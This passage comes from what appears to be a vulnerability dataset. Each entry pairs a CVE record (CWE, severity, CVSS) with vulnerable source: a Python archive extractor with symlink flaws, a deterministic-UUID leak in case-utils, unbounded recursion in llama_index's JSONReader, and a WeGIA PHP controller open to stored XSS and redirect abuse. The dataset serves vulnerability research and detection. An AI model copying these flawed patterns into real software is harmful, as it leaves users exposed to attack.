file_extension == \".gz\":\n                # 一些特别奇葩的项目，是一个gz文件，里面不是tar，只有一个tex文件\n                import gzip\n                with gzip.open(file_path, 'rb') as f_in:\n                    with open(os.path.join(dest_dir, 'main.tex'), 'wb') as f_out:\n                        f_out.write(f_in.read())\n            else:\n                raise e\n\n    # 第三方库，需要预先pip install rarfile\n    # 此外，Windows上还需要安装winrar软件，配置其Path环境变量，如\"C:\\Program Files\\WinRAR\"才可以\n    elif file_extension == \".rar\":\n        try:\n            import rarfile\n\n            with rarfile.RarFile(file_path) as rf:\n                rf.extractall(path=dest_dir)\n                logger.info(\"Successfully extracted rar archive to {}\".format(dest_dir))\n        except:\n            logger.info(\"Rar format requires additional dependencies to install\")\n            return \"\\n\\n解压失败! 需要安装pip install rarfile来解压rar文件。建议：使用zip压缩格式。\"\n\n    # 第三方库，需要预先pip install py7zr\n    elif file_extension == \".7z\":\n        try:\n            import py7zr\n\n            with py7zr.SevenZipFile(file_path, mode=\"r\") as f:\n                f.extractall(path=dest_dir)\n                logger.info(\"Successfully extracted 7z archive to {}\".format(dest_dir))\n        except:\n            logger.info(\"7z format requires additional dependencies to install\")\n            return \"\\n\\n解压失败! 需要安装pip install py7zr来解压7z文件\"\n    else:\n        return \"\"\n    return \"\"\n\n"
        }
      ],
      "method_level": [
        "def extract_archive(file_path, dest_dir):\n    import zipfile\n    import tarfile\n    import os\n\n    # Get the file extension of the input file\n    file_extension = os.path.splitext(file_path)[1]\n\n    # Extract the archive based on its extension\n    if file_extension == \".zip\":\n        with zipfile.ZipFile(file_path, \"r\") as zipobj:\n            zipobj._extract_member = lambda a,b,c: zip_extract_member_new(zipobj, a,b,c)    # 修复中文乱码的问题\n            zipobj.extractall(path=dest_dir)\n            logger.info(\"Successfully extracted zip archive to {}\".format(dest_dir))\n\n    elif file_extension in [\".tar\", \".gz\", \".bz2\"]:\n        try:\n            with tarfile.open(file_path, \"r:*\") as tarobj:\n                # 清理提取路径，移除任何不安全的元素\n                for member in tarobj.getmembers():\n                    member_path = os.path.normpath(member.name)\n                    full_path = os.path.join(dest_dir, member_path)\n                    full_path = os.path.abspath(full_path)\n                    if member.islnk() or member.issym():\n                        raise Exception(f\"Attempted Symlink in {member.name}\")\n                    if not full_path.startswith(os.path.abspath(dest_dir) + os.sep):\n                        raise Exception(f\"Attempted Path Traversal in {member.name}\")\n\n                tarobj.extractall(path=dest_dir)\n                logger.info(\"Successfully extracted tar archive to {}\".format(dest_dir))\n        except tarfile.ReadError as e:\n            if file_extension == \".gz\":\n                # 一些特别奇葩的项目，是一个gz文件，里面不是tar，只有一个tex文件\n                import gzip\n                with gzip.open(file_path, 'rb') as f_in:\n                    with open(os.path.join(dest_dir, 'main.tex'), 'wb') as f_out:\n                        f_out.write(f_in.read())\n            else:\n                raise e\n\n    # 第三方库，需要预先pip install rarfile\n    # 此外，Windows上还需要安装winrar软件，配置其Path环境变量，如\"C:\\Program Files\\WinRAR\"才可以\n    elif file_extension == \".rar\":\n        try:\n            import rarfile\n\n            with rarfile.RarFile(file_path) as rf:\n                rf.extractall(path=dest_dir)\n                logger.info(\"Successfully extracted rar archive to {}\".format(dest_dir))\n        except:\n            logger.info(\"Rar format requires additional dependencies to install\")\n            return \"\\n\\n解压失败! 需要安装pip install rarfile来解压rar文件。建议：使用zip压缩格式。\"\n\n    # 第三方库，需要预先pip install py7zr\n    elif file_extension == \".7z\":\n        try:\n            import py7zr\n\n            with py7zr.SevenZipFile(file_path, mode=\"r\") as f:\n                f.extractall(path=dest_dir)\n                logger.info(\"Successfully extracted 7z archive to {}\".format(dest_dir))\n        except:\n            logger.info(\"7z format requires additional dependencies to install\")\n            return \"\\n\\n解压失败! 需要安装pip install py7zr来解压7z文件\"\n    else:\n        return \"\"\n    return \"\""
      ],
      "hunk_level": [
        {
          "line_no": 135,
          "content": "            import rarfile"
        },
        {
          "line_no": 137,
          "content": "            with rarfile.RarFile(file_path) as rf:"
        },
        {
          "line_no": 138,
          "content": "                rf.extractall(path=dest_dir)"
        },
        {
          "line_no": 139,
          "content": "                logger.info(\"Successfully extracted rar archive to {}\".format(dest_dir))"
        },
        {
          "line_no": 142,
          "content": "            return \"\\n\\n解压失败! 需要安装pip install rarfile来解压rar文件。建议：使用zip压缩格式。\""
        },
        {
          "line_no": 154,
          "content": "            return \"\\n\\n解压失败! 需要安装pip install py7zr来解压7z文件\""
        }
      ]
    },
    "cwe": [
      "CWE-59"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.1
  },
  {
    "id": 52,
    "cve": "CVE-2024-22194",
    "description": "cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. ",
    "vulnerability": {
      "file_level": [
        {
          "name": "case_utils/local_uuid.py",
          "content": "#!/usr/bin/env python3\n\n# Portions of this file contributed by NIST are governed by the following\n# statement:\n#\n# This software was developed at the National Institute of Standards\n# and Technology by employees of the Federal Government in the course\n# of their official duties. Pursuant to Title 17 Section 105 of the\n# United States Code, this software is not subject to copyright\n# protection within the United States. NIST assumes no responsibility\n# whatsoever for its use by other parties, and makes no guarantees,\n# expressed or implied, about its quality, reliability, or any other\n# characteristic.\n#\n# We would appreciate acknowledgement if the software is used.\n\n\"\"\"\nThis library is a wrapper for uuid, provided to generate repeatable UUIDs if requested.\n\nThe function local_uuid() should be used in code where a user could be expected to opt in to non-random UUIDs.\n\"\"\"\n\n__version__ = \"0.4.0\"\n\n__all__ = [\"configure\", \"local_uuid\"]\n\nimport logging\nimport os\nimport pathlib\nimport sys\nimport typing\nimport uuid\nimport warnings\n\nDEMO_UUID_BASE: typing.Optional[str] = None\n\nDEMO_UUID_COUNTER: int = 0\n\n_logger = logging.getLogger(pathlib.Path(__file__).name)\n\n\ndef configure() -> None:\n    \"\"\"\n    This function is part of setting up _demo_uuid() to generate non-random UUIDs.  See _demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid._demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)\n\n\ndef _demo_uuid() -> str:\n    \"\"\"\n    This function generates a repeatable UUID, drawing on non-varying elements of the environment and process call for entropy.\n\n    This function is not intended to be called outside of this module.  Instead, local_uuid() should be called.\n\n    WARNING: This function was developed for use ONLY for reducing (but not eliminating) version-control edits to identifiers when generating sample data.  It creates UUIDs that are decidedly NOT random, and should remain consistent on repeated calls to the importing script.\n\n    To prevent accidental non-random UUID usage, two setup steps need to be done before calling this function:\n\n    * An environment variable, CASE_DEMO_NONRANDOM_UUID_BASE, must be set to a string provided by the caller.  The variable's required value is the path to some directory.  The variable's recommended value is the equivalent of the Make variable \"top_srcdir\" - that is, the root directory of the containing Git repository, some parent of the current process's current working directory.\n    * The configure() function in this module must be called.\n    \"\"\"\n    global DEMO_UUID_BASE\n    global DEMO_UUID_COUNTER\n\n    if os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\") is None:\n        raise ValueError(\n            \"demo_uuid() called without CASE_DEMO_NONRANDOM_UUID_BASE in environment.\"\n        )\n\n    if DEMO_UUID_BASE is None:\n        raise ValueError(\"demo_uuid() called with DEMO_UUID_BASE unset.\")\n\n    parts = [DEMO_UUID_BASE]\n\n    # Component: Incrementing counter.\n    DEMO_UUID_COUNTER += 1\n    parts.append(str(DEMO_UUID_COUNTER))\n\n    return str(uuid.uuid5(uuid.NAMESPACE_URL, \"/\".join(parts)))\n\n\ndef local_uuid() -> str:\n    \"\"\"\n    Generate either a UUID4, or if requested via environment configuration, a non-random demo UUID.\n    \"\"\"\n    global DEMO_UUID_BASE\n    if DEMO_UUID_BASE is None:\n        return str(uuid.uuid4())\n    else:\n        return _demo_uuid()\n"
        }
      ],
      "method_level": [
        "def configure() -> None:\n    \"\"\"\n    This function is part of setting up _demo_uuid() to generate non-random UUIDs.  See _demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid._demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)"
      ],
      "hunk_level": [
        {
          "line_no": 100,
          "content": "        try:"
        },
        {
          "line_no": 106,
          "content": "        except ValueError:"
        },
        {
          "line_no": 107,
          "content": "            # _logger.debug(\"Command path is not relative to virtual environment path.\")"
        },
        {
          "line_no": 108,
          "content": "            demo_uuid_base_parts.append(str(command_resolved_path))"
        }
      ]
    },
    "cwe": [
      "CWE-215",
      "CWE-337"
    ],
    "severity": "LOW",
    "cvss_score": 2.2,
    "cvss_version": 3.1
  },
  {
    "id": 209,
    "cve": "CVE-2025-5472",
    "description": "The JSONReader in run-llama/llama_index versions 0.12.28 is vulnerable to a stack overflow due to uncontrolled recursive JSON parsing. This vulnerability allows attackers to trigger a Denial of Service (DoS) by submitting deeply nested JSON structures, leading to a RecursionError and crashing applications. The root cause is the unsafe recursive traversal design and lack of depth validation, which makes the JSONReader susceptible to stack overflow when processing deeply nested JSON. This impacts the availability of services, making them unreliable and disrupting workflows. The issue is resolved in version 0.12.38.",
    "vulnerability": {
      "file_level": [
        {
          "name": "llama-index-core/llama_index/core/readers/json.py",
          "content": "\"\"\"JSON Reader.\"\"\"\n\nimport json\nimport re\nfrom typing import Any, Dict, Generator, List, Optional\n\nfrom llama_index.core.readers.base import BaseReader\nfrom llama_index.core.schema import Document\n\n\ndef _depth_first_yield(\n    json_data: Any,\n    levels_back: int,\n    collapse_length: Optional[int],\n    path: List[str],\n    ensure_ascii: bool = False,\n) -> Generator[str, None, None]:\n    \"\"\"\n    Do depth first yield of all of the leaf nodes of a JSON.\n\n    Combines keys in the JSON tree using spaces.\n\n    If levels_back is set to 0, prints all levels.\n    If collapse_length is not None and the json_data is <= that number\n      of characters, then we collapse it into one line.\n\n    \"\"\"\n    if isinstance(json_data, (dict, list)):\n        # only try to collapse if we're not at a leaf node\n        json_str = json.dumps(json_data, ensure_ascii=ensure_ascii)\n        if collapse_length is not None and len(json_str) <= collapse_length:\n            new_path = path[-levels_back:]\n            new_path.append(json_str)\n            yield \" \".join(new_path)\n            return\n        elif isinstance(json_data, dict):\n            for key, value in json_data.items():\n                new_path = path[:]\n                new_path.append(key)\n                yield from _depth_first_yield(\n                    value, levels_back, collapse_length, new_path\n                )\n        elif isinstance(json_data, list):\n            for _, value in enumerate(json_data):\n                yield from _depth_first_yield(value, levels_back, collapse_length, path)\n    else:\n        new_path = path[-levels_back:]\n        new_path.append(str(json_data))\n        yield \" \".join(new_path)\n\n\nclass JSONReader(BaseReader):\n    \"\"\"\n    JSON reader.\n\n    Reads JSON documents with options to help suss out relationships between nodes.\n\n    Args:\n        levels_back (int): the number of levels to go back in the JSON tree, 0\n          if you want all levels. If levels_back is None, then we just format the\n          JSON and make each line an embedding\n\n        collapse_length (int): the maximum number of characters a JSON fragment\n          would be collapsed in the output (levels_back needs to be not None)\n          ex: if collapse_length = 10, and\n          input is {a: [1, 2, 3], b: {\"hello\": \"world\", \"foo\": \"bar\"}}\n          then a would be collapsed into one line, while b would not.\n          Recommend starting around 100 and then adjusting from there.\n\n        is_jsonl (Optional[bool]): If True, indicates that the file is in JSONL format.\n        Defaults to False.\n\n        clean_json (Optional[bool]): If True, lines containing only JSON structure are removed.\n        This removes lines that are not as useful. If False, no lines are removed and the document maintains a valid JSON object structure.\n        If levels_back is set the json is not cleaned and this option is ignored.\n        Defaults to True.\n\n    \"\"\"\n\n    def __init__(\n        self,\n        levels_back: Optional[int] = None,\n        collapse_length: Optional[int] = None,\n        ensure_ascii: bool = False,\n        is_jsonl: Optional[bool] = False,\n        clean_json: Optional[bool] = True,\n    ) -> None:\n        \"\"\"Initialize with arguments.\"\"\"\n        super().__init__()\n        self.levels_back = levels_back\n        self.collapse_length = collapse_length\n        self.ensure_ascii = ensure_ascii\n        self.is_jsonl = is_jsonl\n        self.clean_json = clean_json\n\n    def load_data(\n        self, input_file: str, extra_info: Optional[Dict] = {}\n    ) -> List[Document]:\n        \"\"\"Load data from the input file.\"\"\"\n        with open(input_file, encoding=\"utf-8\") as f:\n            load_data = []\n            if self.is_jsonl:\n                for line in f:\n                    load_data.append(json.loads(line.strip()))\n            else:\n                load_data = [json.load(f)]\n\n            documents = []\n            for data in load_data:\n                if self.levels_back is None and self.clean_json is True:\n                    # If levels_back isn't set and clean json is set,\n                    # remove lines containing only formatting, we just format and make each\n                    # line an embedding\n                    json_output = json.dumps(\n                        data, indent=0, ensure_ascii=self.ensure_ascii\n                    )\n                    lines = json_output.split(\"\\n\")\n                    useful_lines = [\n                        line for line in lines if not re.match(r\"^[{}\\[\\],]*$\", line)\n                    ]\n                    documents.append(\n                        Document(text=\"\\n\".join(useful_lines), metadata=extra_info)\n                    )\n\n                elif self.levels_back is None and self.clean_json is False:\n                    # If levels_back isn't set  and clean json is False, create documents without cleaning\n                    json_output = json.dumps(data, ensure_ascii=self.ensure_ascii)\n                    documents.append(Document(text=json_output, metadata=extra_info))\n\n                elif self.levels_back is not None:\n                    # If levels_back is set, we make the embeddings contain the labels\n                    # from further up the JSON tree\n                    lines = [\n                        *_depth_first_yield(\n                            data,\n                            self.levels_back,\n                            self.collapse_length,\n                            [],\n                            self.ensure_ascii,\n                        )\n                    ]\n                    documents.append(\n                        Document(text=\"\\n\".join(lines), metadata=extra_info)\n                    )\n            return documents\n"
        }
      ],
      "method_level": [
        "def load_data(\n        self, input_file: str, extra_info: Optional[Dict] = {}\n    ) -> List[Document]:\n        \"\"\"Load data from the input file.\"\"\"\n        with open(input_file, encoding=\"utf-8\") as f:\n            load_data = []\n            if self.is_jsonl:\n                for line in f:\n                    load_data.append(json.loads(line.strip()))\n            else:\n                load_data = [json.load(f)]\n\n            documents = []\n            for data in load_data:\n                if self.levels_back is None and self.clean_json is True:\n                    # If levels_back isn't set and clean json is set,\n                    # remove lines containing only formatting, we just format and make each\n                    # line an embedding\n                    json_output = json.dumps(\n                        data, indent=0, ensure_ascii=self.ensure_ascii\n                    )\n                    lines = json_output.split(\"\\n\")\n                    useful_lines = [\n                        line for line in lines if not re.match(r\"^[{}\\[\\],]*$\", line)\n                    ]\n                    documents.append(\n                        Document(text=\"\\n\".join(useful_lines), metadata=extra_info)\n                    )\n\n                elif self.levels_back is None and self.clean_json is False:\n                    # If levels_back isn't set  and clean json is False, create documents without cleaning\n                    json_output = json.dumps(data, ensure_ascii=self.ensure_ascii)\n                    documents.append(Document(text=json_output, metadata=extra_info))\n\n                elif self.levels_back is not None:\n                    # If levels_back is set, we make the embeddings contain the labels\n                    # from further up the JSON tree\n                    lines = [\n                        *_depth_first_yield(\n                            data,\n                            self.levels_back,\n                            self.collapse_length,\n                            [],\n                            self.ensure_ascii,\n                        )\n                    ]\n                    documents.append(\n                        Document(text=\"\\n\".join(lines), metadata=extra_info)\n                    )\n            return documents"
      ],
      "hunk_level": [
        {
          "line_no": 100,
          "content": "        with open(input_file, encoding=\"utf-8\") as f:"
        },
        {
          "line_no": 101,
          "content": "            load_data = []"
        },
        {
          "line_no": 102,
          "content": "            if self.is_jsonl:"
        },
        {
          "line_no": 103,
          "content": "                for line in f:"
        },
        {
          "line_no": 104,
          "content": "                    load_data.append(json.loads(line.strip()))"
        },
        {
          "line_no": 105,
          "content": "            else:"
        },
        {
          "line_no": 106,
          "content": "                load_data = [json.load(f)]"
        },
        {
          "line_no": 108,
          "content": "            documents = []"
        },
        {
          "line_no": 109,
          "content": "            for data in load_data:"
        },
        {
          "line_no": 110,
          "content": "                if self.levels_back is None and self.clean_json is True:"
        },
        {
          "line_no": 111,
          "content": "                    # If levels_back isn't set and clean json is set,"
        },
        {
          "line_no": 112,
          "content": "                    # remove lines containing only formatting, we just format and make each"
        },
        {
          "line_no": 113,
          "content": "                    # line an embedding"
        },
        {
          "line_no": 114,
          "content": "                    json_output = json.dumps("
        },
        {
          "line_no": 115,
          "content": "                        data, indent=0, ensure_ascii=self.ensure_ascii"
        },
        {
          "line_no": 116,
          "content": "                    )"
        },
        {
          "line_no": 117,
          "content": "                    lines = json_output.split(\"\\n\")"
        },
        {
          "line_no": 118,
          "content": "                    useful_lines = ["
        },
        {
          "line_no": 119,
          "content": "                        line for line in lines if not re.match(r\"^[{}\\[\\],]*$\", line)"
        },
        {
          "line_no": 120,
          "content": "                    ]"
        },
        {
          "line_no": 121,
          "content": "                    documents.append("
        },
        {
          "line_no": 122,
          "content": "                        Document(text=\"\\n\".join(useful_lines), metadata=extra_info)"
        },
        {
          "line_no": 123,
          "content": "                    )"
        },
        {
          "line_no": 125,
          "content": "                elif self.levels_back is None and self.clean_json is False:"
        },
        {
          "line_no": 126,
          "content": "                    # If levels_back isn't set  and clean json is False, create documents without cleaning"
        },
        {
          "line_no": 127,
          "content": "                    json_output = json.dumps(data, ensure_ascii=self.ensure_ascii)"
        },
        {
          "line_no": 128,
          "content": "                    documents.append(Document(text=json_output, metadata=extra_info))"
        },
        {
          "line_no": 130,
          "content": "                elif self.levels_back is not None:"
        },
        {
          "line_no": 131,
          "content": "                    # If levels_back is set, we make the embeddings contain the labels"
        },
        {
          "line_no": 132,
          "content": "                    # from further up the JSON tree"
        },
        {
          "line_no": 133,
          "content": "                    lines = ["
        },
        {
          "line_no": 134,
          "content": "                        *_depth_first_yield("
        },
        {
          "line_no": 135,
          "content": "                            data,"
        },
        {
          "line_no": 136,
          "content": "                            self.levels_back,"
        },
        {
          "line_no": 137,
          "content": "                            self.collapse_length,"
        },
        {
          "line_no": 138,
          "content": "                            [],"
        },
        {
          "line_no": 139,
          "content": "                            self.ensure_ascii,"
        },
        {
          "line_no": 141,
          "content": "                    ]"
        },
        {
          "line_no": 142,
          "content": "                    documents.append("
        },
        {
          "line_no": 143,
          "content": "                        Document(text=\"\\n\".join(lines), metadata=extra_info)"
        },
        {
          "line_no": 144,
          "content": "                    )"
        }
      ]
    },
    "cwe": [
      "CWE-674"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.0
  },
  {
    "id": 7,
    "cve": "CVE-2025-23035",
    "description": "WeGIA is an open source web manager with a focus on the Portuguese language and charitable institutions. A Stored Cross-Site Scripting (XSS) vulnerability was identified in the `adicionar_tipo_quadro_horario.php` endpoint of the WeGIA application. This vulnerability allows attackers to inject malicious scripts into the `tipo` parameter. The injected scripts are stored on the server and executed automatically whenever the affected page is accessed by users, posing a significant security risk. The application fails to properly validate and sanitize user inputs in the `adicionar_tipo_quadro_horario.php` parameter. This lack of validation allows attackers to inject malicious scripts, which are then stored on the server. Whenever the affected page is accessed, the malicious payload is executed in the victim's browser, potentially compromising the user's data and system. This issue has been addressed in version 3.2.6. All users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "controle/QuadroHorarioControle.php",
          "content": "<?php\ninclude_once '../dao/QuadroHorarioDAO.php';\n\nclass QuadroHorarioControle\n{\n    // Tipos\n\n    public function listarTipo(){\n        extract($_REQUEST);\n        (new QuadroHorarioDAO())->listarTipos();\n        header(\"Location: $nextPage\");\n    }\n\n    public function adicionarTipo(){\n        extract($_REQUEST);\n        session_start();\n        try {\n            $log = (new QuadroHorarioDAO())->adicionarTipo($tipo);;\n            $_SESSION['msg'] = $log;\n        } catch (PDOException $e) {\n            echo(\"Erro ao adicionar tipo '$tipo' ao banco de dados: \" . $e->getMessage());\n            $_SESSION['msg'] = \"Erro ao adicionar tipo: \" . $e->getMessage();\n            $_SESSION['flag'] = \"erro\";\n        }\n        $_SESSION['btnVoltar'] = true;\n        header(\"Location: $nextPage\");\n    }\n\n    public function removerTipo(){\n        extract($_REQUEST);\n        $log = (new QuadroHorarioDAO)->removerTipo($id);\n        session_start();\n        $_SESSION['msg'] = $log;\n        header(\"Location: $nextPage\");\n    }\n\n    // Escalas\n\n    public function listarEscala(){\n        extract($_REQUEST);\n        (new QuadroHorarioDAO())->listarEscalas();\n        header(\"Location: $nextPage\");\n    }\n\n    public function adicionarEscala(){\n        $escala = trim(filter_input(INPUT_POST, 'escala', FILTER_SANITIZE_STRING));\n        $nextPage = trim(filter_input(INPUT_POST, 'nextPage', FILTER_SANITIZE_URL));\n\n        if(!$escala || strlen($escala) == 0){\n            http_response_code(400);\n            echo json_encode(['erro' => 'A escala não pode ser vazia.']);\n            exit();\n        }\n\n        session_start();\n        try {\n            $log = (new QuadroHorarioDAO())->adicionarEscala($escala);\n            $_SESSION['msg'] = $log;\n        } catch (PDOException $e) {\n            echo(\"Erro ao adicionar escala '$escala' ao banco de dados: \" . $e->getMessage());\n            $_SESSION['msg'] = \"Erro ao adicionar escala: \" . $e->getMessage();\n            $_SESSION['flag'] = \"erro\";\n        }\n        $_SESSION['btnVoltar'] = true;\n\n        if($nextPage){\n            header(\"Location: $nextPage\");\n        }\n    }\n\n    public function removerEscala(){\n        extract($_REQUEST);\n        $log = (new QuadroHorarioDAO)->removerEscala($id);\n        session_start();\n        $_SESSION['msg'] = $log;\n        header(\"Location: $nextPage\");\n    }\n}"
        }
      ],
      "method_level": [
        "public function listarTipo(){\n        extract($_REQUEST);\n        (new QuadroHorarioDAO())->listarTipos();\n        header(\"Location: $nextPage\");\n    }",
        "public function adicionarTipo(){\n        extract($_REQUEST);\n        session_start();\n        try {\n            $log = (new QuadroHorarioDAO())->adicionarTipo($tipo);;\n            $_SESSION['msg'] = $log;\n        } catch (PDOException $e) {\n            echo(\"Erro ao adicionar tipo '$tipo' ao banco de dados: \" . $e->getMessage());\n            $_SESSION['msg'] = \"Erro ao adicionar tipo: \" . $e->getMessage();\n            $_SESSION['flag'] = \"erro\";\n        }\n        $_SESSION['btnVoltar'] = true;\n        header(\"Location: $nextPage\");\n    }",
        "public function removerTipo(){\n        extract($_REQUEST);\n        $log = (new QuadroHorarioDAO)->removerTipo($id);\n        session_start();\n        $_SESSION['msg'] = $log;\n        header(\"Location: $nextPage\");\n    }",
        "public function listarEscala(){\n        extract($_REQUEST);\n        (new QuadroHorarioDAO())->listarEscalas();\n        header(\"Location: $nextPage\");\n    }",
        "public function adicionarEscala(){\n        $escala = trim(filter_input(INPUT_POST, 'escala', FILTER_SANITIZE_STRING));\n        $nextPage = trim(filter_input(INPUT_POST, 'nextPage', FILTER_SANITIZE_URL));\n\n        if(!$escala || strlen($escala) == 0){\n            http_response_code(400);\n            echo json_encode(['erro' => 'A escala não pode ser vazia.']);\n            exit();\n        }\n\n        session_start();\n        try {\n            $log = (new QuadroHorarioDAO())->adicionarEscala($escala);\n            $_SESSION['msg'] = $log;\n        } catch (PDOException $e) {\n            echo(\"Erro ao adicionar escala '$escala' ao banco de dados: \" . $e->getMessage());\n            $_SESSION['msg'] = \"Erro ao adicionar escala: \" . $e->getMessage();\n            $_SESSION['flag'] = \"erro\";\n        }\n        $_SESSION['btnVoltar'] = true;\n\n        if($nextPage){\n            header(\"Location: $nextPage\");\n        }\n    }",
        "public function removerEscala(){\n        extract($_REQUEST);\n        $log = (new QuadroHorarioDAO)->removerEscala($id);\n        session_start();\n        $_SESSION['msg'] = $log;\n        header(\"Location: $nextPage\");\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 8,
          "content": "    public function listarTipo(){"
        },
        {
          "line_no": 14,
          "content": "    public function adicionarTipo(){"
        },
        {
          "line_no": 15,
          "content": "        extract($_REQUEST);"
        },
        {
          "line_no": 21,
          "content": "            echo(\"Erro ao adicionar tipo '$tipo' ao banco de dados: \" . $e->getMessage());"
        },
        {
          "line_no": 26,
          "content": "        header(\"Location: $nextPage\");"
        },
        {
          "line_no": 29,
          "content": "    public function removerTipo(){"
        },
        {
          "line_no": 39,
          "content": "    public function listarEscala(){"
        },
        {
          "line_no": 45,
          "content": "    public function adicionarEscala(){"
        },
        {
          "line_no": 49,
          "content": "        if(!$escala || strlen($escala) == 0){"
        },
        {
          "line_no": 60,
